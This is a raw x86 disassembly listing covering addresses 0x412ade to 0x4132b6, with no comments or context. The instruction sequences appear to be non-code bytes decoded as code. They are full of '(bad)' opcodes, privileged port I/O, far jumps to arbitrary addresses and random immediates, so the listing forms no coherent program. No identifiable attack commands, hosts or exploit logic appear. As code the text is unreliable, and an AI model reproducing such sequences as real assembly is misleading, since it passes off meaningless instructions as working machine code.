  412ade:	fist   WORD PTR [ebx+0x7813168f]
  412ae4:	push   ebp
  412ae5:	lahf   
  412ae6:	mov    eax,ds:0x55604bb9
  412aeb:	mov    esi,0xb3940a4a
  412af0:	inc    ebp
  412af1:	sbb    ch,BYTE PTR [edi+ecx*8-0x713c3564]
  412af8:	ret    
  412af9:	(bad)  
  412afa:	jg     0x412b23
  412afc:	clc    
  412afd:	int3   
  412afe:	in     eax,dx
  412aff:	shl    BYTE PTR [esi+0x13],1
  412b02:	xor    eax,DWORD PTR [edi-0x67acaf4e]
  412b08:	xchg   edi,eax
  412b09:	xchg   edi,eax
  412b0a:	bound  ebx,QWORD PTR [edi]
  412b0c:	(bad)  
  412b0d:	iret   
  412b0e:	imul   esi,DWORD PTR [ecx-0x21],0x84ce4555
  412b15:	cmc    
  412b16:	dec    eax
  412b17:	stos   BYTE PTR es:[edi],al
  412b18:	ret    0x8588
  412b1b:	dec    edi
  412b1c:	inc    ecx
  412b1d:	test   eax,0x90f09aaf
  412b22:	sub    al,0x84
  412b24:	fnstsw WORD PTR [ebx]
  412b26:	mov    ebx,0x93fcbadf
  412b2b:	ss retf 0x2026
  412b2f:	idiv   DWORD PTR [edx-0x64]
  412b32:	adc    edx,ebx
  412b34:	jp     0x412acf
  412b36:	into   
  412b37:	lods   al,BYTE PTR ds:[esi]
  412b38:	dec    edi
  412b39:	pop    eax
  412b3a:	in     eax,0xbe
  412b3c:	jnp    0x412b09
  412b3e:	xor    al,0xa7
  412b40:	dec    edx
  412b41:	push   ss
  412b42:	outs   dx,BYTE PTR ds:[esi]
  412b43:	sti    
  412b44:	ss mov edx,0xab1f1d4
  412b4a:	add    dl,BYTE PTR [eax-0x2a5296d1]
  412b50:	adc    bl,cl
  412b52:	in     al,0x33
  412b54:	pushf  
  412b55:	push   ss
  412b56:	test   al,0xd5
  412b58:	mov    bl,0x55
  412b5a:	pushf  
  412b5b:	xchg   edx,eax
  412b5c:	das    
  412b5d:	mov    ch,0x76
  412b5f:	dec    ebx
  412b60:	mov    ?,WORD PTR [esi]
  412b62:	aaa    
  412b63:	(bad)  
  412b65:	xlat   BYTE PTR ds:[ebx]
  412b66:	mov    edi,0x37ed56e8
  412b6b:	ret    0xf945
  412b6e:	lahf   
  412b6f:	cmp    DWORD PTR [ebp-0x3b],esi
  412b72:	dec    ebp
  412b73:	or     BYTE PTR [eax+0x65],al
  412b76:	fs adc eax,0xcda0567a
  412b7c:	dec    edi
  412b7d:	cmp    ch,ch
  412b7f:	loope  0x412bcf
  412b81:	jb     0x412b84
  412b83:	out    dx,eax
  412b84:	mov    edi,DWORD PTR [ebx+0x3f32048d]
  412b8a:	fdiv   DWORD PTR [esi]
  412b8c:	out    0x66,al
  412b8e:	clc    
  412b8f:	mov    es,WORD PTR [edx]
  412b91:	xor    bl,bh
  412b93:	mov    eax,0x4fe0a20
  412b98:	adc    eax,0xee22301a
  412b9d:	xchg   ebx,eax
  412b9e:	int3   
  412b9f:	bound  esp,QWORD PTR [ebx]
  412ba1:	inc    esi
  412ba2:	add    al,0x10
  412ba4:	or     bl,al
  412ba6:	sar    dh,0x67
  412ba9:	mov    ah,0xd7
  412bab:	inc    eax
  412bac:	cmp    al,0x46
  412bae:	int    0xb8
  412bb0:	dec    ecx
  412bb1:	pop    ebp
  412bb2:	xlat   BYTE PTR ds:[ebx]
  412bb4:	mov    esp,0x247ed39d
  412bb9:	scas   al,BYTE PTR es:[edi]
  412bba:	or     DWORD PTR [edx+0x37d88fbd],eax
  412bc0:	pop    DWORD PTR [ebx+eax*2+0x15]
  412bc4:	ret    
  412bc5:	mov    dl,BYTE PTR [ebp-0x3ab047ab]
  412bcb:	cld    
  412bcc:	xor    al,0xf2
  412bce:	dec    eax
  412bcf:	or     dh,BYTE PTR [ebp-0x34ecfc8c]
  412bd5:	pop    esi
  412bd6:	or     ebp,DWORD PTR [edx-0x39e808b6]
  412bdc:	mov    bh,0x27
  412bde:	mov    DWORD PTR [eax-0x21],edi
  412be1:	daa    
  412be2:	sbb    al,0x76
  412be4:	pop    DWORD PTR [ebx-0x36ae8aef]
  412bea:	cwde   
  412beb:	mov    edi,0x66a88f62
  412bf0:	pop    ss
  412bf1:	inc    edx
  412bf2:	dec    edx
  412bf3:	in     eax,0x4
  412bf5:	xlat   BYTE PTR ds:[ebx]
  412bf6:	or     al,0xcf
  412bf8:	sub    al,0xa8
  412bfa:	xor    DWORD PTR [ebx],0x6c
  412bfd:	mov    al,ds:0x5b925a79
  412c02:	sub    DWORD PTR [esi+0x43],edi
  412c05:	add    al,0x20
  412c07:	popf   
  412c08:	ins    BYTE PTR es:[edi],dx
  412c09:	arpl   WORD PTR [edx],bx
  412c0b:	ret    
  412c0c:	lds    ebp,FWORD PTR [edx+0x6bf40e6e]
  412c12:	adc    eax,eax
  412c14:	ins    BYTE PTR es:[edi],dx
  412c15:	scas   eax,DWORD PTR es:[edi]
  412c16:	fcomp  DWORD PTR [ebx-0x62]
  412c19:	inc    ebx
  412c1a:	jp     0x412be7
  412c1c:	add    ecx,DWORD PTR ds:0x47d2d68c
  412c22:	or     ecx,DWORD PTR [esi]
  412c24:	xchg   esp,eax
  412c25:	adc    al,0xc0
  412c27:	std    
  412c28:	fwait
  412c29:	cld    
  412c2a:	test   BYTE PTR [edi-0xc05cb6e],dh
  412c30:	mov    ecx,0xdf075344
  412c35:	in     eax,dx
  412c36:	mov    cl,0x96
  412c38:	scas   al,BYTE PTR es:[edi]
  412c39:	outs   dx,DWORD PTR ds:[esi]
  412c3a:	add    DWORD PTR [ecx+esi*1-0x3eedbbd4],0x3a96417c
  412c45:	mov    edx,0x950cf34d
  412c4a:	sar    esp,0x8e
  412c4d:	pop    edi
  412c4e:	inc    edi
  412c4f:	aaa    
  412c50:	pop    ebp
  412c51:	push   ds
  412c52:	inc    edi
  412c53:	jecxz  0x412cb9
  412c55:	sbb    ch,ch
  412c57:	enter  0x4846,0x8c
  412c5b:	sub    edx,DWORD PTR [ecx]
  412c5d:	cmp    DWORD PTR [edi+0x17f9a094],0xc1b6982a
  412c67:	outs   dx,DWORD PTR ds:[esi]
  412c68:	ss test bl,al
  412c6b:	mov    al,ds:0xa220cea0
  412c70:	pop    edi
  412c71:	imul   ebp,DWORD PTR ds:0xfca7cfb,0xffffffe9
  412c78:	or     BYTE PTR [eax+0x5c],ch
  412c7b:	arpl   sp,di
  412c7d:	imul   esp,DWORD PTR [ebp+0x56b24ba3],0x6abe1dbd
  412c87:	(bad)  [edi-0x6b26caf1]
  412c8d:	scas   eax,DWORD PTR es:[edi]
  412c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c8f:	ins    BYTE PTR es:[edi],dx
  412c90:	or     bh,BYTE PTR [eax-0x179a9039]
  412c96:	(bad)  
  412c97:	retf   0xbe0
  412c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c9b:	daa    
  412c9c:	mov    edx,0x78381158
  412ca1:	lds    esi,FWORD PTR [esi+eiz*2+0x13]
  412ca5:	leave  
  412ca6:	imul   ebx,DWORD PTR [ebp-0x237a16d8],0x33894605
  412cb0:	inc    ebp
  412cb1:	jge    0x412cc7
  412cb3:	ret    
  412cb4:	mov    esi,0x81b735c2
  412cb9:	xor    BYTE PTR [eax-0x2d],0xb5
  412cbd:	test   eax,0xab759030
  412cc2:	add    ah,BYTE PTR [edx+0x5b040882]
  412cc8:	pop    esp
  412cc9:	dec    esp
  412cca:	sahf   
  412ccb:	mov    ds:0x22b897e0,eax
  412cd0:	sti    
  412cd1:	push   es
  412cd2:	fcomp  QWORD PTR [edi]
  412cd4:	xor    al,0xd7
  412cd6:	and    bh,BYTE PTR [edx+0x65994a51]
  412cdc:	imul   edx,DWORD PTR [edi],0x33
  412cdf:	mov    al,ds:0x9285e738
  412ce4:	fmulp  st(5),st
  412ce6:	adc    esp,edx
  412ce8:	gs ret 
  412cea:	pusha  
  412ceb:	mov    eax,ds:0x89e7963d
  412cf0:	sbb    DWORD PTR [edi+0x72fd6b59],esi
  412cf6:	mov    al,0xd2
  412cf8:	retf   
  412cf9:	cdq    
  412cfa:	popf   
  412cfb:	xor    eax,0x230437dc
  412d00:	sub    al,0x50
  412d02:	mov    esp,DWORD PTR ds:0xfa521008
  412d08:	inc    eax
  412d09:	push   eax
  412d0a:	data16 loopne 0x412d40
  412d0d:	jno    0x412d48
  412d0f:	mov    dh,0x1b
  412d11:	sub    eax,0x41f8ab01
  412d16:	inc    ecx
  412d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d18:	pop    ebp
  412d19:	or     ch,dh
  412d1b:	jne    0x412cf7
  412d1d:	add    edx,edx
  412d1f:	jnp    0x412d5d
  412d21:	jns    0x412cfb
  412d23:	pop    ecx
  412d24:	dec    edi
  412d25:	mov    ?,WORD PTR [eax-0x53d6d642]
  412d2b:	fisubr DWORD PTR [ecx]
  412d2d:	mov    esp,0x2ebdab1a
  412d32:	cmp    eax,0xb5b9cd57
  412d37:	sub    al,BYTE PTR [edx-0x36a63b73]
  412d3d:	or     DWORD PTR [ecx],ecx
  412d3f:	div    BYTE PTR gs:[edx-0x4e77dced]
  412d46:	mov    bh,0x1e
  412d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d49:	ret    
  412d4a:	cmp    ebx,DWORD PTR [ebp+0x194c5830]
  412d50:	lock push ecx
  412d52:	mov    cl,0x6d
  412d54:	ret    0x2d8f
  412d57:	aad    0x5a
  412d59:	inc    esp
  412d5a:	cmp    dl,BYTE PTR [edi-0x10]
  412d5d:	inc    edx
  412d5e:	add    edx,eax
  412d60:	dec    esi
  412d61:	(bad)  
  412d62:	int    0x7b
  412d64:	cwde   
  412d65:	data16 stos BYTE PTR es:[edi],al
  412d67:	xchg   BYTE PTR [edi],ah
  412d69:	fidiv  DWORD PTR [esi]
  412d6b:	ret    
  412d6c:	addr16 repnz inc ebx
  412d6f:	inc    ebx
  412d70:	sub    eax,edx
  412d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d73:	fs or  eax,0x1015719d
  412d79:	pop    ebx
  412d7a:	push   ds
  412d7b:	aad    0xb7
  412d7d:	mov    dh,0x5f
  412d7f:	gs jae 0x412dad
  412d82:	xchg   ebx,esi
  412d84:	frstor [ebx+0x59]
  412d87:	xor    eax,0x7163850
  412d8c:	sub    ch,dh
  412d8e:	sbb    DWORD PTR [eax+ebx*2],esi
  412d91:	ss dec eax
  412d93:	mov    ecx,0x7832589d
  412d98:	mov    al,0x1
  412d9a:	fistp  WORD PTR [ecx+0x5f7e1d02]
  412da0:	pop    esp
  412da1:	inc    esp
  412da2:	retf   
  412da3:	fcom   QWORD PTR [eax+edi*4]
  412da6:	pushf  
  412da7:	int3   
  412da8:	fcmovb st,st(6)
  412daa:	ror    ebx,1
  412dac:	aas    
  412dad:	retf   
  412dae:	xchg   edx,eax
  412daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db0:	icebp  
  412db1:	jno    0x412d83
  412db3:	in     al,0xc7
  412db5:	mov    edi,0x4c0064b4
  412dba:	not    DWORD PTR [edx]
  412dbc:	test   DWORD PTR [edx-0x1e],eax
  412dbf:	mov    cl,0x5e
  412dc1:	xor    eax,0xfe3da7a4
  412dc6:	fwait
  412dc7:	out    dx,al
  412dc8:	dec    ecx
  412dc9:	(bad)  
  412dca:	aad    0x4b
  412dcc:	inc    ch
  412dce:	cwde   
  412dcf:	xchg   ecx,eax
  412dd0:	dec    eax
  412dd1:	lahf   
  412dd2:	cwde   
  412dd3:	les    edi,FWORD PTR [edi-0x3aa539e7]
  412dd9:	ins    BYTE PTR es:[edi],dx
  412dda:	pop    ebx
  412ddb:	sub    DWORD PTR [eax],ebp
  412ddd:	(bad)  
  412dde:	jns    0x412d98
  412de0:	push   ds
  412de1:	mov    ebp,0x9fbbf9bf
  412de6:	pop    esp
  412de7:	bound  eax,QWORD PTR [eax+0x20da868a]
  412ded:	loope  0x412e43
  412def:	jmp    0xa41723c6
  412df4:	mov    BYTE PTR [ebp+edi*4+0x2a],ah
  412df8:	lahf   
  412df9:	mov    dh,0xc3
  412dfb:	mov    BYTE PTR [ebx],cl
  412dfd:	cli    
  412dfe:	cdq    
  412dff:	imul   edx,DWORD PTR [ecx],0xdadee014
  412e05:	push   es
  412e06:	scas   eax,DWORD PTR es:[edi]
  412e07:	xchg   DWORD PTR [esi-0x80],esi
  412e0a:	sub    ecx,esi
  412e0c:	adc    eax,0x4311331
  412e11:	(bad)  
  412e12:	loopne 0x412e67
  412e14:	or     eax,DWORD PTR [edx-0x4ff94e4f]
  412e1a:	and    DWORD PTR [esi+0x7e1928e7],ebp
  412e20:	cdq    
  412e21:	mov    esp,0x3726558e
  412e26:	fldenv [ecx-0x55]
  412e29:	jg     0x412e3e
  412e2b:	mov    edi,0x83212701
  412e30:	add    al,0x3d
  412e32:	lods   eax,DWORD PTR ds:[esi]
  412e33:	push   0x64
  412e35:	mov    ds:0xe759f765,al
  412e3a:	mov    eax,ds:0x4c8f8192
  412e3f:	push   ss
  412e40:	fstp   QWORD PTR [ecx+0x287f760a]
  412e46:	sti    
  412e47:	inc    ebp
  412e48:	mov    dl,0xb8
  412e4a:	icebp  
  412e4b:	mov    dl,0x1
  412e4d:	push   ss
  412e4e:	ja     0x412e73
  412e50:	dec    eax
  412e51:	pop    edi
  412e52:	call   0xfc23ea0a
  412e57:	outs   dx,BYTE PTR ds:[esi]
  412e58:	mov    ch,0x76
  412e5a:	xchg   ecx,eax
  412e5b:	pop    edi
  412e5c:	outs   dx,DWORD PTR ds:[esi]
  412e5d:	outs   dx,BYTE PTR ds:[esi]
  412e5e:	enter  0xeff,0xb3
  412e62:	inc    ecx
  412e63:	mov    eax,0x8674bb6b
  412e68:	jle    0x412e07
  412e6a:	inc    esp
  412e6b:	pop    edx
  412e6c:	stos   DWORD PTR es:[edi],eax
  412e6d:	les    ebp,FWORD PTR [edi+0x1eb6cac1]
  412e73:	test   al,0x33
  412e75:	rcl    edx,cl
  412e77:	pop    edx
  412e78:	dec    eax
  412e79:	xchg   ebx,eax
  412e7a:	outs   dx,DWORD PTR ds:[esi]
  412e7b:	ss inc edx
  412e7d:	sub    eax,0x9af341b2
  412e82:	cmc    
  412e83:	inc    ebp
  412e84:	(bad)  
  412e85:	xchg   ebx,eax
  412e86:	rcl    DWORD PTR [ebx+0x4d58e08a],1
  412e8c:	pusha  
  412e8d:	sar    BYTE PTR [edx+0x2],1
  412e90:	add    dl,bl
  412e92:	scas   al,BYTE PTR es:[edi]
  412e93:	pop    edx
  412e94:	nop
  412e95:	aaa    
  412e96:	sub    ch,BYTE PTR [edx+0x3]
  412e99:	pop    ss
  412e9a:	mov    esp,0xb1dafce
  412e9f:	stos   BYTE PTR es:[edi],al
  412ea0:	add    al,0xa
  412ea2:	cmp    eax,0xf50f6260
  412ea7:	mov    ah,0xd8
  412ea9:	add    ecx,esp
  412eab:	pop    esp
  412eac:	arpl   WORD PTR [eax],ax
  412eae:	add    BYTE PTR [eax-0x46],dh
  412eb1:	mov    ch,0xd0
  412eb3:	fdivr  QWORD PTR [edi-0x5f]
  412eb6:	xchg   ebp,eax
  412eb7:	mov    DWORD PTR [ecx-0x621283b9],ebp
  412ebd:	iret   
  412ebe:	jl     0x412e64
  412ec0:	out    dx,eax
  412ec1:	jnp    0x412ec3
  412ec3:	or     eax,0x1fa6cdc8
  412ec8:	xor    ah,ch
  412eca:	(bad)  
  412ecb:	xor    ebx,DWORD PTR ds:0xe3667b42
  412ed1:	jle    0x412e96
  412ed3:	mov    ah,0x93
  412ed5:	ds cmc 
  412ed7:	int3   
  412ed8:	xor    BYTE PTR [edi],dh
  412eda:	push   edx
  412edb:	popa   
  412edc:	mov    esp,0x5a63c7d
  412ee1:	gs dec ecx
  412ee3:	std    
  412ee4:	adc    BYTE PTR [edx+0xe],bl
  412ee7:	shl    DWORD PTR [eax+0x2e],0x7d
  412eeb:	loope  0x412f4f
  412eed:	es mov bl,0xa1
  412ef0:	push   ss
  412ef1:	xor    al,0x49
  412ef3:	jb     0x412f01
  412ef5:	arpl   WORD PTR [ebp+0x1aaba85e],bx
  412efb:	inc    edi
  412efc:	jecxz  0x412ee8
  412efe:	sbb    DWORD PTR [ebx+0x29aeaecc],esi
  412f04:	sti    
  412f05:	jno    0x412f77
  412f07:	paddusw mm6,QWORD PTR [ecx+0x37078bc2]
  412f0e:	je     0x412ece
  412f10:	add    eax,0x87fd663a
  412f15:	jp     0x412eb3
  412f17:	gs push ebp
  412f19:	mov    dl,0xd9
  412f1b:	pop    ss
  412f1c:	mov    ebp,0x5a47943d
  412f21:	inc    edi
  412f22:	fbstp  TBYTE PTR [edx]
  412f24:	aaa    
  412f25:	fnsave [esi-0x60]
  412f28:	repnz mov ch,0x3d
  412f2b:	js     0x412f10
  412f2d:	inc    esp
  412f2e:	pop    ds
  412f2f:	pop    edi
  412f30:	imul   edx,DWORD PTR [edx+0x52fe94cc],0x10
  412f37:	push   0x9
  412f39:	mov    cl,0x8a
  412f3b:	mul    DWORD PTR [ecx-0x4cf292f7]
  412f41:	adc    al,0xe0
  412f43:	sub    DWORD PTR [ecx+0x14f3ea09],eax
  412f49:	fsub   st(1),st
  412f4b:	jp     0x412fb4
  412f4d:	jnp    0x412f1e
  412f4f:	adc    eax,0xe3d165b8
  412f54:	add    BYTE PTR [edx],dl
  412f56:	jmp    FWORD PTR [edx]
  412f58:	xor    eax,0x3cef0d62
  412f5d:	pop    ss
  412f5e:	sahf   
  412f5f:	loope  0x412f49
  412f61:	lock and BYTE PTR [ebx+0x65],cl
  412f65:	loope  0x412f83
  412f67:	adc    bh,BYTE PTR [edx-0x7cb4fe93]
  412f6d:	pusha  
  412f6e:	sub    ax,bx
  412f71:	adc    BYTE PTR ds:0x2dc2673c,cl
  412f77:	jg     0x412f99
  412f79:	cdq    
  412f7a:	sbb    BYTE PTR [eax],bl
  412f7c:	jne    0x412f9d
  412f7e:	js     0x412f3b
  412f80:	sbb    BYTE PTR [ebp+0x592b3371],ah
  412f86:	xor    al,0x8b
  412f88:	push   ss
  412f89:	(bad)  
  412f8b:	mov    ecx,0x4db4ecc8
  412f90:	pop    edi
  412f91:	inc    esi
  412f92:	div    BYTE PTR [eax-0x33fe5ab0]
  412f98:	call   0x37a:0xbbc11f90
  412f9f:	inc    ecx
  412fa0:	jmp    0x71ac9081
  412fa5:	dec    ebp
  412fa6:	adc    eax,0xc866f852
  412fab:	ds int 0xf8
  412fae:	mov    DWORD PTR [ebx+0x59],edx
  412fb1:	jmp    0x38840041
  412fb6:	sub    DWORD PTR [edx],edx
  412fb8:	daa    
  412fb9:	jmp    0x412f90
  412fbb:	xor    BYTE PTR ss:[ecx],al
  412fbe:	je     0x412f46
  412fc0:	xor    ch,BYTE PTR [edx+0x63f9f2e7]
  412fc6:	or     dl,BYTE PTR [ecx+0x144b413d]
  412fcc:	ss ret 
  412fce:	push   ebx
  412fcf:	scas   eax,DWORD PTR es:[edi]
  412fd0:	and    BYTE PTR [ebp-0x5c],dh
  412fd3:	inc    esi
  412fd4:	xor    al,BYTE PTR ds:0xba20b62f
  412fda:	call   0x40a94a0a
  412fdf:	js     0x412ffe
  412fe1:	and    eax,0x7c1459da
  412fe6:	loope  0x41305b
  412fe8:	call   DWORD PTR [ebx+0x49]
  412feb:	in     eax,dx
  412fec:	loopne 0x412fde
  412fee:	dec    ebp
  412fef:	jp     0x413039
  412ff1:	mov    eax,0xd3e796c7
  412ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ff7:	div    ah
  412ff9:	loop   0x41302b
  412ffb:	les    ebp,FWORD PTR [esi]
  412ffd:	addr16 pop ds
  412fff:	imul   eax,DWORD PTR [ebx+0x62],0xffffff93
  413003:	jl     0x413047
  413005:	xor    eax,0xde99efcb
  41300a:	pusha  
  41300b:	fwait
  41300c:	or     esp,DWORD PTR ds:0x27073c4a
  413012:	out    0xd7,eax
  413014:	mov    ds:0x6b007f4a,al
  413019:	or     DWORD PTR [ecx+0xc997ac4],edi
  41301f:	fidiv  WORD PTR [ebx-0x23953d67]
  413025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413026:	add    al,0x1b
  413028:	sbb    BYTE PTR [eax+ecx*1],bh
  41302b:	scas   eax,DWORD PTR es:[edi]
  41302c:	out    0xb9,al
  41302e:	stos   DWORD PTR es:[edi],eax
  41302f:	iret   
  413030:	sbb    eax,DWORD PTR [ecx-0x313efb24]
  413036:	or     BYTE PTR [edi-0x70bdc988],bl
  41303c:	add    eax,0x1f63c6cf
  413041:	or     eax,0x35a1ac4f
  413046:	xor    BYTE PTR [edi],0xd6
  413049:	shl    DWORD PTR [ebx-0x20],cl
  41304c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41304d:	cld    
  41304e:	cs and cl,bh
  413051:	and    al,bl
  413053:	mov    cs,WORD PTR [ecx+ebx*8-0x4d0d52d3]
  41305a:	push   cs
  41305b:	in     al,0x97
  41305d:	div    BYTE PTR ds:0xc28dbc0b
  413063:	adc    esp,ecx
  413065:	jno    0x41305f
  413067:	(bad)  
  413068:	sub    eax,0xc4ebe447
  41306d:	rol    edx,1
  41306f:	sbb    BYTE PTR [edx+ecx*1+0x51],ah
  413073:	add    bh,al
  413075:	jp     0x413052
  413077:	sti    
  413078:	lods   eax,DWORD PTR ds:[esi]
  413079:	sub    DWORD PTR [ebx+0x44],ebx
  41307c:	and    ah,dl
  41307e:	outs   dx,DWORD PTR ds:[esi]
  41307f:	or     DWORD PTR [ebp+0x4a],esp
  413082:	mov    edi,0x3ed5b65
  413087:	pop    ss
  413088:	add    eax,ebx
  41308a:	jbe    0x413098
  41308c:	(bad)  
  41308d:	fcom   DWORD PTR [edi+ebp*1-0x49]
  413091:	push   esp
  413092:	(bad)  
  413093:	fldcw  WORD PTR [esi-0x4e]
  413096:	dec    esi
  413097:	mov    ds:0xd2865f06,al
  41309c:	sub    dh,BYTE PTR [esi+0x3f]
  41309f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130a1:	mov    ecx,0xab711f45
  4130a6:	popa   
  4130a7:	pop    ebp
  4130a8:	cmp    al,0x74
  4130aa:	mov    eax,0xf66eaecd
  4130af:	imul   esi,DWORD PTR [ecx+0x4d],0xbd754b1a
  4130b6:	or     eax,0x2ffbe14d
  4130bb:	jnp    0x4130c7
  4130bd:	pop    ss
  4130be:	imul   ebp,edi,0x79ccb718
  4130c4:	inc    ebp
  4130c5:	(bad)  
  4130c6:	cmp    ah,ah
  4130c8:	daa    
  4130c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130ca:	popa   
  4130cb:	xor    al,0xe
  4130cd:	inc    BYTE PTR [ebx+0x49]
  4130d0:	adc    BYTE PTR [eax+0x38],ch
  4130d3:	lods   al,BYTE PTR ds:[esi]
  4130d4:	imul   ecx,DWORD PTR [edi-0x76],0xffffff98
  4130d8:	leave  
  4130d9:	pushf  
  4130da:	test   al,0xe6
  4130dc:	pop    ecx
  4130dd:	inc    edi
  4130de:	jmp    0xaa6680de
  4130e3:	jl     0x413148
  4130e5:	nop
  4130e6:	imul   edx,DWORD PTR [ecx+0x13],0xfffffffb
  4130ea:	in     eax,dx
  4130eb:	neg    BYTE PTR [ebx+0x35]
  4130ee:	sub    al,0x69
  4130f0:	lea    ebp,[edi-0x684bd70c]
  4130f6:	enter  0xf230,0x95
  4130fa:	mov    sp,0x1ec3
  4130fe:	jno    0x41315b
  413100:	aam    0x75
  413102:	into   
  413103:	(bad)  
  413104:	lock or dh,BYTE PTR [esi+0x2c]
  413108:	pop    ds
  413109:	cli    
  41310a:	(bad)  
  41310c:	ret    0xc764
  41310f:	aam    0xb3
  413111:	adc    DWORD PTR [ecx+0x4c],esp
  413114:	repnz inc ebx
  413116:	rol    BYTE PTR [esi+0xb],cl
  413119:	mov    BYTE PTR [esi-0x5d69531f],dh
  41311f:	and    eax,0xff343f5c
  413124:	add    dl,cl
  413126:	mov    ah,bh
  413128:	retf   0xd5e9
  41312b:	imul   ebx,DWORD PTR [eax+0x35acdcfc],0x8e7165af
  413135:	dec    ecx
  413136:	or     eax,0x974b1ede
  41313b:	adc    eax,0x45b4738d
  413140:	test   eax,0x245beb49
  413145:	je     0x4131b1
  413147:	call   0x6f2c1a18
  41314c:	jmp    0x41317f
  41314e:	jb     0x41310c
  413150:	sbb    BYTE PTR [esi],dh
  413152:	inc    ecx
  413153:	in     eax,0xdb
  413155:	mov    ds:0x9fc56ae3,eax
  41315a:	jb     0x4131a7
  41315c:	jle    0x4131bf
  41315e:	pushf  
  41315f:	cmp    ebx,DWORD PTR [esi]
  413161:	test   DWORD PTR [ecx+0x6632a490],ebx
  413167:	add    eax,0xad943b40
  41316c:	inc    ebp
  41316d:	push   cs
  41316e:	cld    
  41316f:	push   ds
  413170:	sar    al,0xfa
  413173:	push   esi
  413174:	mov    dh,0xf8
  413176:	mov    al,ds:0xb38be4dc
  41317b:	or     DWORD PTR [ecx],0x4b
  41317e:	mov    bl,0x4d
  413180:	ss fwait
  413182:	popa   
  413183:	dec    esi
  413184:	(bad)  
  413185:	cli    
  413186:	and    bh,BYTE PTR [esi]
  413188:	loopne 0x413188
  41318a:	das    
  41318b:	push   0x626f2193
  413190:	and    DWORD PTR [edx-0x6ec4d70a],0xffffffb1
  413197:	add    dh,BYTE PTR [eax+0x41]
  41319a:	aam    0x23
  41319c:	dec    esi
  41319d:	pop    ebx
  41319e:	cmp    ecx,DWORD PTR [esi-0x5ee3a894]
  4131a4:	sub    al,0x40
  4131a6:	and    eax,0x72775be2
  4131ab:	cmp    bh,BYTE PTR [ebx]
  4131ad:	sub    eax,0xbfcb2b72
  4131b2:	iret   
  4131b3:	mov    esp,0x3bedaf38
  4131b8:	stos   DWORD PTR es:[edi],eax
  4131b9:	repz or DWORD PTR [ebx+0x4d],esp
  4131bd:	adc    eax,0xb3925178
  4131c2:	mov    edx,0x54b9d2ba
  4131c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131c8:	xor    al,0xce
  4131ca:	pop    ecx
  4131cb:	shr    DWORD PTR [eax],cl
  4131cd:	dec    esp
  4131ce:	clc    
  4131cf:	xchg   edi,eax
  4131d0:	jns    0x4131f9
  4131d2:	call   0x66272137
  4131d7:	or     eax,0x567cf3b5
  4131dc:	inc    edx
  4131dd:	das    
  4131de:	inc    eax
  4131df:	push   edx
  4131e1:	dec    esp
  4131e2:	ds pushf 
  4131e4:	cmp    cl,ah
  4131e6:	push   edi
  4131e7:	sbb    cl,BYTE PTR [ebx]
  4131e9:	ja     0x41320b
  4131eb:	adc    ebx,edx
  4131ed:	repz lahf 
  4131ef:	mov    edx,0x9290d9c8
  4131f4:	shr    ebx,cl
  4131f6:	or     al,0xdc
  4131f8:	ror    DWORD PTR [ecx+0x1],cl
  4131fb:	cmp    BYTE PTR [ebx+0x5d4b382e],bh
  413201:	test   DWORD PTR [ecx],edx
  413203:	mov    bh,0x59
  413205:	mov    al,ds:0xd83b81b
  41320a:	adc    edi,DWORD PTR [ecx-0x498acc10]
  413210:	cwde   
  413211:	and    dh,BYTE PTR [ebx-0x12a1542a]
  413217:	xor    BYTE PTR [edi-0x47],bl
  41321a:	mov    edi,0x534dd24c
  41321f:	(bad)  
  413220:	loop   0x41321e
  413222:	pop    DWORD PTR [ecx+esi*8+0x59]
  413226:	sub    esp,ecx
  413228:	repnz movs DWORD PTR es:[di],DWORD PTR ds:[si]
  41322b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41322c:	in     al,dx
  41322d:	push   es
  41322e:	(bad)  
  41322f:	mov    dh,0x42
  413231:	in     eax,0x7a
  413233:	xchg   ecx,eax
  413234:	into   
  413235:	adc    edi,DWORD PTR [esi]
  413237:	fild   WORD PTR [ebp-0x72d6a991]
  41323d:	fs ret 
  41323f:	xchg   ebx,eax
  413240:	pushf  
  413241:	je     0x4132b3
  413243:	icebp  
  413244:	cmp    BYTE PTR [ecx],bl
  413246:	mov    cl,0x68
  413248:	ret    
  413249:	(bad)  
  41324a:	xor    DWORD PTR [ecx+0x75],eax
  41324d:	loop   0x413258
  41324f:	and    BYTE PTR [esi],bh
  413251:	mov    dl,BYTE PTR [eax-0x2ce1d05f]
  413257:	loopne 0x41325e
  413259:	mov    eax,ds:0x31211810
  41325e:	jmp    0xca34:0x5429fe56
  413265:	fadd   QWORD PTR [ebp+0x55688b49]
  41326b:	push   es
  41326c:	xor    DWORD PTR [esi],ebx
  41326e:	add    edi,DWORD PTR [eax+0x31]
  413271:	aas    
  413272:	jmp    0x9ff1:0x737cf035
  413279:	cli    
  41327a:	int3   
  41327b:	je     0x413247
  41327d:	arpl   WORD PTR [ebx+0x6f],sp
  413280:	test   al,0x10
  413282:	scas   eax,DWORD PTR es:[edi]
  413283:	nop
  413284:	mov    cl,BYTE PTR [ebx*4+0x788e41e0]
  41328b:	mov    ebp,0x22bff713
  413290:	in     al,0xdf
  413292:	ret    
  413293:	lods   eax,DWORD PTR ds:[esi]
  413294:	mov    ch,0x53
  413296:	xchg   ecx,eax
  413297:	leave  
  413298:	addr16 (bad) 
  41329a:	mov    al,ds:0x83f6612c
  41329f:	xchg   edx,eax
  4132a0:	fsub   DWORD PTR [ebx+0x58c5483]
  4132a6:	sub    ebx,DWORD PTR [ecx]
  4132a8:	fwait
  4132a9:	mov    ss,WORD PTR [eax+0xfac8b2c]
  4132af:	jo     0x413257
  4132b1:	and    eax,0x3fa8f45c
  4132b6:	cmp    bh,BYTE PTR [eax+0x282b5f6d]
